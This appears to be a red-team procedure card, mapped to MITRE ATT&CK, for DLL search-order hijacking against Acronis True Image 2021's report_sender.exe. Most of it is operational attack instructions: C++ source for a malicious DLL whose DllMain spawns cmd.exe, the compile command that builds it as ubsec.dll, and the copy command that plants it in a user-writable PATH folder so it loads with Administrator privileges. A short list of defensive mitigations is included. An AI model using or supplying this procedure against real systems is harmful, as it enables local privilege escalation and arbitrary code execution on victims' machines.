---
id: prep-malicious-dll-001
tags:
  - dll-hijacking
  - preparation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Hijack Execution Flow]]'
updated_at: '2025-12-14T17:29:20.097Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
---
# Prepare-Malicious-DLL-for-Hijacking

## Summary

This procedure involves compiling a malicious DLL that executes arbitrary code (e.g., spawning cmd.exe) and placing it in a user-writable directory in the system PATH, exploiting the DLL search order in Acronis True Image 2021's report_sender.exe.

## Description

The root cause is report_sender.exe searching for non-existent DLLs like ubsec.dll in the PATH, including %USERPROFILE%\AppData\Local\Microsoft\WindowsApps, which is writable by standard users. By placing a malicious DLL there, it gets loaded with Administrator privileges when feedback or crash reports are sent. This enables arbitrary code execution. Prerequisites include a C++ development environment and local user access.

## Requirements

1. Windows machine with Visual Studio or MinGW for C++ compilation
2. Write access to %USERPROFILE%\AppData\Local\Microsoft\WindowsApps
3. Acronis True Image 2021 installed (though not needed for this step)

## Defense

Defensive measures and detection strategies:

- Restrict write access to PATH directories
- Use DLL secure loading APIs like SetDllDirectory or LoadLibraryEx with LOAD_LIBRARY_SEARCH_SYSTEM32
- Monitor DLL loads in protected directories via EDR tools

## Objectives

1. Position malicious DLL for hijacking
2. Ensure DLL executes payload upon load
3. Prepare for elevated execution trigger

## Instructions

### Step 1: Compile Malicious DLL

**Context**: Write and compile C++ code that spawns cmd.exe in the DLL's DllMain entry point.

Example C++ code (save as malicious.cpp):
```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        WinExec("cmd.exe", SW_SHOW);
        break;
    }
    return TRUE;
}
```

Compile using Visual Studio or cl.exe:
```cmd
cl /LD malicious.cpp /link /DLL /OUT:ubsec.dll
```

> This creates ubsec.dll that spawns cmd.exe on load. Expected output: No compilation errors, ubsec.dll generated.

### Step 2: Place DLL in Writable PATH Directory

**Context**: Copy the DLL to a directory searched by the application.

Use copy command:
```cmd
copy ubsec.dll %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\ubsec.dll
```

> Expected output: File copied successfully. Verify with dir %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\ubsec.dll.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow: DLL Search Order Hijacking

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[dll-hijacking]]
- [[windows]]
